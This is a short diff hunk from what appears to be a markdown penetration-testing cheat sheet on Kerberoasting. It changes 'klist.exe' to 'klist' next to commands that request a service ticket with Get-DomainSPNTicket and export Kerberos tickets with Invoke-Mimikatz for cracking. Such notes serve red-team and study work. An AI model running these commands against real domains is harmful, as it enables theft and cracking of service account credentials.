@@ -563,7 +563,7 @@ OR
 ```Get-DomainSPNTicket -SPN ops/whatever1```
 
 #### Check, export, and crack the ticket
-```klist.exe```
+```klist```
 
 ```Invoke-Mimikatz -Command '"kerberos::list /export"'```
 
